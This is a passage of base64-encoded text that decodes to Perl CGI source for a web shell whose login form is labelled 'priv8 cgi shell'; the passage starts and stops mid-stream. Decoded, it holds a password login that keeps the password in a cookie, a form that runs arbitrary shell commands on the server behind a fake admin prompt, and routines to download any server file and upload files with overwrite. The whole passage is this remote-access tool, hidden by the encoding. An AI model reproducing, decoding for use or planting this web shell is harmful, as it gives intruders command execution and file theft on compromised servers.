Pjxicj4NCjwvY29kZT4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50
cyB0aGUgSFRNTCBmb3JtIGZvciBsb2dnaW5nIGluDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpz
dWIgUHJpbnRMb2dpbkZvcm0NCnsNCglwcmludCA8PEVORDsNCjxjb2RlPg0KDQo8Zm9ybSBuYW1l
PSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCjxpbnB1dCB0eXBl
PSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJsb2dpbiI+DQo8L2ZvbnQ+DQo8Zm9udCBzaXplPSIz
Ij4NCmxvZ2luOiA8YiBzdHlsZT0iY29sb3I6YmxhY2s7YmFja2dyb3VuZC1jb2xvcjojZmZmZjY2
Ij5wcml2OCBjZ2kgc2hlbGw8L2I+PGJyPg0KcGFzc3dvcmQ6PC9mb250Pjxmb250IGNvbG9yPSIj
MDA5OTAwIiBzaXplPSIzIj48aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InAiPg0KPGlucHV0
IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4NCjwvZm9ybT4NCjwvY29kZT4NCkVORA0KfQ0K
DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgZm9vdGVyIGZvciB0aGUgSFRN
TCBQYWdlDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRQYWdlRm9vdGVyDQp7DQoJ
cHJpbnQgIjwvZm9udD48L2JvZHk+PC9odG1sPiI7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0NCiMgUmV0cmVpdmVzIHRoZSB2YWx1ZXMgb2YgYWxsIGNvb2tpZXMuIFRoZSBjb29raWVzIGNh
biBiZSBhY2Nlc3NlcyB1c2luZyB0aGUNCiMgdmFyaWFibGUgJENvb2tpZXN7Jyd9DQojLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tDQpzdWIgR2V0Q29va2llcw0Kew0KCUBodHRwY29va2llcyA9IHNwbGl0
KC87IC8sJEVOVnsnSFRUUF9DT09LSUUnfSk7DQoJZm9yZWFjaCAkY29va2llKEBodHRwY29va2ll
cykNCgl7DQoJCSgkaWQsICR2YWwpID0gc3BsaXQoLz0vLCAkY29va2llKTsNCgkJJENvb2tpZXN7
JGlkfSA9ICR2YWw7DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0
aGUgc2NyZWVuIHdoZW4gdGhlIHVzZXIgbG9ncyBvdXQNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0N
CnN1YiBQcmludExvZ291dFNjcmVlbg0Kew0KCXByaW50ICI8Y29kZT5Db25uZWN0aW9uIGNsb3Nl
ZCBieSBmb3JlaWduIGhvc3QuPGJyPjxicj48L2NvZGU+IjsNCn0NCg0KIy0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLQ0KIyBMb2dzIG91dCB0aGUgdXNlciBhbmQgYWxsb3dzIHRoZSB1c2VyIHRvIGxvZ2lu
IGFnYWluDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUGVyZm9ybUxvZ291dA0Kew0KCXBy
aW50ICJTZXQtQ29va2llOiBTQVZFRFBXRD07XG4iOyAjIHJlbW92ZSBwYXNzd29yZCBjb29raWUN
CgkmUHJpbnRQYWdlSGVhZGVyKCJwIik7DQoJJlByaW50TG9nb3V0U2NyZWVuOw0KDQoJJlByaW50
TG9naW5TY3JlZW47DQoJJlByaW50TG9naW5Gb3JtOw0KCSZQcmludFBhZ2VGb290ZXI7DQp9DQoN
CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgdG8gbG9n
aW4gdGhlIHVzZXIuIElmIHRoZSBwYXNzd29yZCBtYXRjaGVzLCBpdA0KIyBkaXNwbGF5cyBhIHBh
Z2UgdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gcnVuIGNvbW1hbmRzLiBJZiB0aGUgcGFzc3dvcmQg
ZG9lbnMndA0KIyBtYXRjaCBvciBpZiBubyBwYXNzd29yZCBpcyBlbnRlcmVkLCBpdCBkaXNwbGF5
cyBhIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXINCiMgdG8gbG9naW4NCiMtLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0NCnN1YiBQZXJmb3JtTG9naW4gDQp7DQoJaWYoJExvZ2luUGFzc3dvcmQgZXEgJFBh
c3N3b3JkKSAjIHBhc3N3b3JkIG1hdGNoZWQNCgl7DQoJCXByaW50ICJTZXQtQ29va2llOiBTQVZF
RFBXRD0kTG9naW5QYXNzd29yZDtcbiI7DQoJCSZQcmludFBhZ2VIZWFkZXIoImMiKTsNCgkJJlBy
aW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQoJCSZQcmludFBhZ2VGb290ZXI7DQoJfQ0KCWVsc2Ug
IyBwYXNzd29yZCBkaWRuJ3QgbWF0Y2gNCgl7DQoJCSZQcmludFBhZ2VIZWFkZXIoInAiKTsNCgkJ
JlByaW50TG9naW5TY3JlZW47DQoJCWlmKCRMb2dpblBhc3N3b3JkIG5lICIiKSAjIHNvbWUgcGFz
c3dvcmQgd2FzIGVudGVyZWQNCgkJew0KCQkJJlByaW50TG9naW5GYWlsZWRNZXNzYWdlOw0KDQoJ
CX0NCgkJJlByaW50TG9naW5Gb3JtOw0KCQkmUHJpbnRQYWdlRm9vdGVyOw0KCX0NCn0NCg0KIy0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSB0aGF0IGFsbG93cyB0
aGUgdXNlciB0byBlbnRlciBjb21tYW5kcw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFBy
aW50Q29tbWFuZExpbmVJbnB1dEZvcm0NCnsNCgkkUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50
RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCglwcmludCA8
PEVORDsNCjxjb2RlPg0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3Jp
cHRMb2NhdGlvbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iY29tbWFu
ZCI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPg0K
JFByb21wdA0KPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImMiPg0KPGlucHV0IHR5cGU9InN1Ym1p
dCIgdmFsdWU9IkVudGVyIj4NCjwvZm9ybT4NCjwvY29kZT4NCg0KRU5EDQp9DQoNCiMtLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVz
ZXIgdG8gZG93bmxvYWQgZmlsZXMNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludEZp
bGVEb3dubG9hZEZvcm0NCnsNCgkkUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDog
IlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCglwcmludCA8PEVORDsNCjxj
b2RlPg0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlv
biI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPg0K
PGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImRvd25sb2FkIj4NCiRQcm9tcHQg
ZG93bmxvYWQ8YnI+PGJyPg0KRmlsZW5hbWU6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJmIiBz
aXplPSIzNSI+PGJyPjxicj4NCkRvd25sb2FkOiA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0i
QmVnaW4iPg0KPC9mb3JtPg0KPC9jb2RlPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gdXBsb2Fk
IGZpbGVzDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRGaWxlVXBsb2FkRm9ybQ0K
ew0KCSRQcm9tcHQgPSAkV2luTlQgPyAiJEN1cnJlbnREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVy
TmFtZSAkQ3VycmVudERpcl1cJCAiOw0KCXByaW50IDw8RU5EOw0KPGNvZGU+DQoNCjxmb3JtIG5h
bWU9ImYiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIG1ldGhvZD0iUE9TVCIgYWN0aW9u
PSIkU2NyaXB0TG9jYXRpb24iPg0KJFByb21wdCB1cGxvYWQ8YnI+PGJyPg0KRmlsZW5hbWU6IDxp
bnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmIiBzaXplPSIzNSI+PGJyPjxicj4NCk9wdGlvbnM6ICZu
YnNwOzxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0ibyIgdmFsdWU9Im92ZXJ3cml0ZSI+DQpP
dmVyd3JpdGUgaWYgaXQgRXhpc3RzPGJyPjxicj4NClVwbG9hZDombmJzcDsmbmJzcDsmbmJzcDs8
aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQmVnaW4iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIg
bmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9
ImEiIHZhbHVlPSJ1cGxvYWQiPg0KPC9mb3JtPg0KPC9jb2RlPg0KRU5EDQp9DQoNCiMtLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdGltZW91
dCBmb3IgYSBjb21tYW5kIGV4cGlyZXMuIFdlIG5lZWQgdG8NCiMgdGVybWluYXRlIHRoZSBzY3Jp
cHQgaW1tZWRpYXRlbHkuIFRoaXMgZnVuY3Rpb24gaXMgdmFsaWQgb25seSBvbiBVbml4LiBJdCBp
cw0KIyBuZXZlciBjYWxsZWQgd2hlbiB0aGUgc2NyaXB0IGlzIHJ1bm5pbmcgb24gTlQuDQojLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQ29tbWFuZFRpbWVvdXQNCnsNCglpZighJFdpbk5UKQ0K
CXsNCgkJYWxhcm0oMCk7DQoJCXByaW50IDw8RU5EOw0KPC94bXA+DQoNCjxjb2RlPg0KQ29tbWFu
ZCBleGNlZWRlZCBtYXhpbXVtIHRpbWUgb2YgJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gc2Vjb25k
KHMpLg0KPGJyPktpbGxlZCBpdCENCkVORA0KCQkmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsN
CgkJJlByaW50UGFnZUZvb3RlcjsNCgkJZXhpdDsNCgl9DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgdG8gZXhlY3V0ZSBjb21tYW5kcy4gSXQg
ZGlzcGxheXMgdGhlIG91dHB1dCBvZiB0aGUNCiMgY29tbWFuZCBhbmQgYWxsb3dzIHRoZSB1c2Vy
IHRvIGVudGVyIGFub3RoZXIgY29tbWFuZC4gVGhlIGNoYW5nZSBkaXJlY3RvcnkNCiMgY29tbWFu
ZCBpcyBoYW5kbGVkIGRpZmZlcmVudGx5LiBJbiB0aGlzIGNhc2UsIHRoZSBuZXcgZGlyZWN0b3J5
IGlzIHN0b3JlZCBpbg0KIyBhbiBpbnRlcm5hbCB2YXJpYWJsZSBhbmQgaXMgdXNlZCBlYWNoIHRp
bWUgYSBjb21tYW5kIGhhcyB0byBiZSBleGVjdXRlZC4gVGhlDQojIG91dHB1dCBvZiB0aGUgY2hh
bmdlIGRpcmVjdG9yeSBjb21tYW5kIGlzIG5vdCBkaXNwbGF5ZWQgdG8gdGhlIHVzZXJzDQojIHRo
ZXJlZm9yZSBlcnJvciBtZXNzYWdlcyBjYW5ub3QgYmUgZGlzcGxheWVkLg0KIy0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLQ0Kc3ViIEV4ZWN1dGVDb21tYW5kDQp7DQoJaWYoJFJ1bkNvbW1hbmQgPX4gbS9e
XHMqY2RccysoLispLykgIyBpdCBpcyBhIGNoYW5nZSBkaXIgY29tbWFuZA0KCXsNCgkJIyB3ZSBj
aGFuZ2UgdGhlIGRpcmVjdG9yeSBpbnRlcm5hbGx5LiBUaGUgb3V0cHV0IG9mIHRoZQ0KCQkjIGNv
bW1hbmQgaXMgbm90IGRpc3BsYXllZC4NCgkJDQoJCSRPbGREaXIgPSAkQ3VycmVudERpcjsNCgkJ
JENvbW1hbmQgPSAiY2QgXCIkQ3VycmVudERpclwiIi4kQ21kU2VwLiJjZCAkMSIuJENtZFNlcC4k
Q21kUHdkOw0KCQljaG9wKCRDdXJyZW50RGlyID0gYCRDb21tYW5kYCk7DQoJCSZQcmludFBhZ2VI
ZWFkZXIoImMiKTsNCgkJJFByb21wdCA9ICRXaW5OVCA/ICIkT2xkRGlyPiAiIDogIlthZG1pblxA
JFNlcnZlck5hbWUgJE9sZERpcl1cJCAiOw0KCQlwcmludCAiJFByb21wdCAkUnVuQ29tbWFuZCI7
DQoJfQ0KCWVsc2UgIyBzb21lIG90aGVyIGNvbW1hbmQsIGRpc3BsYXkgdGhlIG91dHB1dA0KCXsN
CgkJJlByaW50UGFnZUhlYWRlcigiYyIpOw0KCQkkUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50
RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCgkJcHJpbnQg
IiRQcm9tcHQgJFJ1bkNvbW1hbmQ8eG1wPiI7DQoJCSRDb21tYW5kID0gImNkIFwiJEN1cnJlbnRE
aXJcIiIuJENtZFNlcC4kUnVuQ29tbWFuZC4kUmVkaXJlY3RvcjsNCgkJaWYoISRXaW5OVCkNCgkJ
ew0KCQkJJFNJR3snQUxSTSd9ID0gXCZDb21tYW5kVGltZW91dDsNCgkJCWFsYXJtKCRDb21tYW5k
VGltZW91dER1cmF0aW9uKTsNCgkJfQ0KCQlpZigkU2hvd0R5bmFtaWNPdXRwdXQpICMgc2hvdyBv
dXRwdXQgYXMgaXQgaXMgZ2VuZXJhdGVkDQoJCXsNCgkJCSR8PTE7DQoJCQkkQ29tbWFuZCAuPSAi
IHwiOw0KCQkJb3BlbihDb21tYW5kT3V0cHV0LCAkQ29tbWFuZCk7DQoJCQl3aGlsZSg8Q29tbWFu
ZE91dHB1dD4pDQoJCQl7DQoJCQkJJF8gPX4gcy8oXG58XHJcbikkLy87DQoJCQkJcHJpbnQgIiRf
XG4iOw0KCQkJfQ0KCQkJJHw9MDsNCgkJfQ0KCQllbHNlICMgc2hvdyBvdXRwdXQgYWZ0ZXIgY29t
bWFuZCBjb21wbGV0ZXMNCgkJew0KCQkJcHJpbnQgYCRDb21tYW5kYDsNCgkJfQ0KCQlpZighJFdp
bk5UKQ0KCQl7DQoJCQlhbGFybSgwKTsNCgkJfQ0KCQlwcmludCAiPC94bXA+IjsNCgl9DQoJJlBy
aW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQoJJlByaW50UGFnZUZvb3RlcjsNCn0NCg0KIy0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGRpc3BsYXlzIHRoZSBwYWdlIHRoYXQg
Y29udGFpbnMgYSBsaW5rIHdoaWNoIGFsbG93cyB0aGUgdXNlcg0KIyB0byBkb3dubG9hZCB0aGUg
c3BlY2lmaWVkIGZpbGUuIFRoZSBwYWdlIGFsc28gY29udGFpbnMgYSBhdXRvLXJlZnJlc2gNCiMg
ZmVhdHVyZSB0aGF0IHN0YXJ0cyB0aGUgZG93bmxvYWQgYXV0b21hdGljYWxseS4NCiMgQXJndW1l
bnQgMTogRnVsbHkgcXVhbGlmaWVkIGZpbGVuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2Fk
ZWQNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludERvd25sb2FkTGlua1BhZ2UNCnsN
Cglsb2NhbCgkRmlsZVVybCkgPSBAXzsNCglpZigtZSAkRmlsZVVybCkgIyBpZiB0aGUgZmlsZSBl
eGlzdHMNCgl7DQoJCSMgZW5jb2RlIHRoZSBmaWxlIGxpbmsgc28gd2UgY2FuIHNlbmQgaXQgdG8g
dGhlIGJyb3dzZXINCgkJJEZpbGVVcmwgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJI
KiIsJDEpL2VnOw0KCQkkRG93bmxvYWRMaW5rID0gIiRTY3JpcHRMb2NhdGlvbj9hPWRvd25sb2Fk
JmY9JEZpbGVVcmwmbz1nbyI7DQoJCSRIdG1sTWV0YUhlYWRlciA9ICI8bWV0YSBIVFRQLUVRVUlW
PVwiUmVmcmVzaFwiIENPTlRFTlQ9XCIxOyBVUkw9JERvd25sb2FkTGlua1wiPiI7DQoJCSZQcmlu
dFBhZ2VIZWFkZXIoImMiKTsNCgkJcHJpbnQgPDxFTkQ7DQo8Y29kZT4NCg0KU2VuZGluZyBGaWxl
ICRUcmFuc2ZlckZpbGUuLi48YnI+DQpJZiB0aGUgZG93bmxvYWQgZG9lcyBub3Qgc3RhcnQgYXV0
b21hdGljYWxseSwNCjxhIGhyZWY9IiREb3dubG9hZExpbmsiPkNsaWNrIEhlcmU8L2E+Lg0KRU5E
DQoJCSZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KCQkmUHJpbnRQYWdlRm9vdGVyOw0KCX0N
CgllbHNlICMgZmlsZSBkb2Vzbid0IGV4aXN0DQoJew0KCQkmUHJpbnRQYWdlSGVhZGVyKCJmIik7
DQoJCXByaW50ICJGYWlsZWQgdG8gZG93bmxvYWQgJEZpbGVVcmw6ICQhIjsNCgkJJlByaW50Rmls
ZURvd25sb2FkRm9ybTsNCgkJJlByaW50UGFnZUZvb3RlcjsNCgl9DQp9DQoNCiMtLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiByZWFkcyB0aGUgc3BlY2lmaWVkIGZpbGUgZnJv
bSB0aGUgZGlzayBhbmQgc2VuZHMgaXQgdG8gdGhlDQojIGJyb3dzZXIsIHNvIHRoYXQgaXQgY2Fu
IGJlIGRvd25sb2FkZWQgYnkgdGhlIHVzZXIuDQojIEFyZ3VtZW50IDE6IEZ1bGx5IHF1YWxpZmll
ZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBzZW50Lg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LQ0Kc3ViIFNlbmRGaWxlVG9Ccm93c2VyDQp7DQoJbG9jYWwoJFNlbmRGaWxlKSA9IEBfOw0KCWlm
KG9wZW4oU0VOREZJTEUsICRTZW5kRmlsZSkpICMgZmlsZSBvcGVuZWQgZm9yIHJlYWRpbmcNCgl7
DQoJCWlmKCRXaW5OVCkNCgkJew0KCQkJYmlubW9kZShTRU5ERklMRSk7DQoJCQliaW5tb2RlKFNU
RE9VVCk7DQoJCX0NCgkJJEZpbGVTaXplID0gKHN0YXQoJFNlbmRGaWxlKSlbN107DQoJCSgkRmls
ZW5hbWUgPSAkU2VuZEZpbGUpID1+ICBtIShbXi9eXFxdKikkITsNCgkJcHJpbnQgIkNvbnRlbnQt
VHlwZTogYXBwbGljYXRpb24veC11bmtub3duXG4iOw0KCQlwcmludCAiQ29udGVudC1MZW5ndGg6
ICRGaWxlU2l6ZVxuIjsNCgkJcHJpbnQgIkNvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7
IGZpbGVuYW1lPSQxXG5cbiI7DQoJCXByaW50IHdoaWxlKDxTRU5ERklMRT4pOw0KCQljbG9zZShT
RU5ERklMRSk7DQoJfQ0KCWVsc2UgIyBmYWlsZWQgdG8gb3BlbiBmaWxlDQoJew0KCQkmUHJpbnRQ
YWdlSGVhZGVyKCJmIik7DQoJCXByaW50ICJGYWlsZWQgdG8gZG93bmxvYWQgJFNlbmRGaWxlOiAk
ISI7DQoJCSZQcmludEZpbGVEb3dubG9hZEZvcm07DQoNCgkJJlByaW50UGFnZUZvb3RlcjsNCgl9
DQp9DQoNCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxl
ZCB3aGVuIHRoZSB1c2VyIGRvd25sb2FkcyBhIGZpbGUuIEl0IGRpc3BsYXlzIGEgbWVzc2FnZQ0K
IyB0byB0aGUgdXNlciBhbmQgcHJvdmlkZXMgYSBsaW5rIHRocm91Z2ggd2hpY2ggdGhlIGZpbGUg
Y2FuIGJlIGRvd25sb2FkZWQuDQojIFRoaXMgZnVuY3Rpb24gaXMgYWxzbyBjYWxsZWQgd2hlbiB0
aGUgdXNlciBjbGlja3Mgb24gdGhhdCBsaW5rLiBJbiB0aGlzIGNhc2UsDQojIHRoZSBmaWxlIGlz
IHJlYWQgYW5kIHNlbnQgdG8gdGhlIGJyb3dzZXIuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpz
dWIgQmVnaW5Eb3dubG9hZA0Kew0KCSMgZ2V0IGZ1bGx5IHF1YWxpZmllZCBwYXRoIG9mIHRoZSBm
aWxlIHRvIGJlIGRvd25sb2FkZWQNCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9e
XFx8Xi46LykpIHwNCgkJKCEkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cLy8pKSkgIyBw
YXRoIGlzIGFic29sdXRlDQoJew0KCQkkVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7DQoJfQ0K
CWVsc2UgIyBwYXRoIGlzIHJlbGF0aXZlDQoJew0KCQljaG9wKCRUYXJnZXRGaWxlKSBpZigkVGFy
Z2V0RmlsZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOw0KCQkkVGFyZ2V0RmlsZSAuPSAk
UGF0aFNlcC4kVHJhbnNmZXJGaWxlOw0KCX0NCg0KCWlmKCRPcHRpb25zIGVxICJnbyIpICMgd2Ug
aGF2ZSB0byBzZW5kIHRoZSBmaWxlDQoJew0KCQkmU2VuZEZpbGVUb0Jyb3dzZXIoJFRhcmdldEZp
bGUpOw0KCX0NCgllbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQ0KCXsN
CgkJJlByaW50RG93bmxvYWRMaW5rUGFnZSgkVGFyZ2V0RmlsZSk7DQoJfQ0KfQ0KDQojLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIg
d2FudHMgdG8gdXBsb2FkIGEgZmlsZS4gSWYgdGhlDQojIGZpbGUgaXMgbm90IHNwZWNpZmllZCwg
aXQgZGlzcGxheXMgYSBmb3JtIGFsbG93aW5nIHRoZSB1c2VyIHRvIHNwZWNpZnkgYQ0KIyBmaWxl
LCBvdGhlcndpc2UgaXQgc3RhcnRzIHRoZSB1cGxvYWQgcHJvY2Vzcy4NCiMtLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0NCnN1YiBVcGxvYWRGaWxlDQp7DQoJIyBpZiBubyBmaWxlIGlzIHNwZWNpZmllZCwg
cHJpbnQgdGhlIHVwbG9hZCBmb3JtIGFnYWluDQoJaWYoJFRyYW5zZmVyRmlsZSBlcSAiIikNCgl7
DQoJCSZQcmludFBhZ2VIZWFkZXIoImYiKTsNCgkJJlByaW50RmlsZVVwbG9hZEZvcm07DQoJCSZQ
cmludFBhZ2VGb290ZXI7DQoJCXJldHVybjsNCgl9DQoJJlByaW50UGFnZUhlYWRlcigiYyIpOw0K
DQoJIyBzdGFydCB0aGUgdXBsb2FkaW5nIHByb2Nlc3MNCglwcmludCAiVXBsb2FkaW5nICRUcmFu
c2ZlckZpbGUgdG8gJEN1cnJlbnREaXIuLi48YnI+IjsNCg0KCSMgZ2V0IHRoZSBmdWxsbHkgcXVh
bGlmaWVkIHBhdGhuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGNyZWF0ZWQNCgljaG9wKCRUYXJnZXRO
